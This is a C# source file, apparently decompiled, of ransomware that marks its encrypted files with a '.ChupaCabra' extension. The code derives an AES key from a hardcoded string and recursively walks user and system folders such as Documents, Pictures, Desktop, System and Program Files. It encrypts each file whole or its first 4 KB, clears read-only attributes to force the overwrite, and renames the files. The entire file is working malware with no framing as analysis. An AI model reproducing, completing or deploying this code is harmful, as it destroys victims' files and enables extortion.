using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace ns0;

internal sealed class Class2
{
	public enum Enum0
	{
		const_0,
		const_1,
		const_2
	}

	private static int int_0;

	private static int int_1;

	private static int int_2;

	public static string string_0 = "ugsojfsoejoigjwpfdsfmisofjksepfselfs[gkreopf";

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(int int_3, int int_4, string string_1, int int_5);

	public static byte[] smethod_0(byte[] byte_0)
	{
		byte[] array = null;
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Encoding.ASCII.GetBytes(string_0), Encoding.ASCII.GetBytes(string_0), 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(byte_0, 0, byte_0.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void smethod_1(string string_1)
	{
		try
		{
			try
			{
				if (new FileInfo(string_1).Length <= 4096)
				{
					byte[] bytes = smethod_0(File.ReadAllBytes(string_1));
					File.WriteAllBytes(string_1, bytes);
					File.Move(string_1, string_1 + ".ChupaCabra");
				}
				else if (new FileInfo(string_1).Length <= 30000000)
				{
					byte[] array = new byte[8192];
					using (BinaryReader binaryReader = new BinaryReader(File.Open(string_1, FileMode.Open)))
					{
						byte[] array2 = smethod_0(binaryReader.ReadBytes(4096));
						Array.Copy(array2, array, array2.Length);
					}
					using (BinaryWriter binaryWriter = new BinaryWriter(File.Open(string_1, FileMode.Open)))
					{
						binaryWriter.Write(array);
					}
					File.Move(string_1, string_1 + ".ChupaCabra");
				}
			}
			catch (Exception)
			{
				FileAttributes attributes = File.GetAttributes(string_1);
				if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
				{
					attributes = smethod_2(attributes, FileAttributes.ReadOnly);
					File.SetAttributes(string_1, attributes);
				}
				if (new FileInfo(string_1).Length <= 4096)
				{
					byte[] bytes2 = smethod_0(File.ReadAllBytes(string_1));
					File.WriteAllBytes(string_1, bytes2);
					File.Move(string_1, string_1 + ".ChupaCabra");
				}
				else if (new FileInfo(string_1).Length <= 30000000)
				{
					byte[] buffer = new byte[8192];
					using (BinaryReader binaryReader2 = new BinaryReader(File.Open(string_1, FileMode.Open)))
					{
						buffer = smethod_0(binaryReader2.ReadBytes(4096));
					}
					using (BinaryWriter binaryWriter2 = new BinaryWriter(File.Open(string_1, FileMode.Open)))
					{
						binaryWriter2.Write(buffer);
					}
					File.Move(string_1, string_1 + ".ChupaCabra");
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static FileAttributes smethod_2(FileAttributes fileAttributes_0, FileAttributes fileAttributes_1)
	{
		return fileAttributes_0 & ~fileAttributes_1;
	}

	public static void smethod_3(string string_1)
	{
		try
		{
			string[] files = Directory.GetFiles(string_1);
			string[] directories = Directory.GetDirectories(string_1);
			for (int i = 0; i < files.Length; i++)
			{
				if (!Path.GetExtension(files[i])!.Contains("ChupaCabra"))
				{
					smethod_1(files[i]);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				smethod_3(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	internal void method_0()
	{
	}

	internal static void smethod_4()
	{
		if (!File.Exists(Environment.GetEnvironmentVariable("ProgramData") + "\\trig"))
		{
			string[] array = new string[20]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.Recent),
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
				Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
				Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
				Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
				Environment.GetFolderPath(Environment.SpecialFolder.Personal),
				Environment.GetFolderPath(Environment.SpecialFolder.Favorites),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory),
				Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
				Environment.GetFolderPath(Environment.SpecialFolder.System),
				Environment.GetFolderPath(Environment.SpecialFolder.Personal),
				Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
				Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
				Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
			};
			for (int i = 0; i < array.Length; i++)
			{
				smethod_3(array[i]);
			}
		}
	}
}
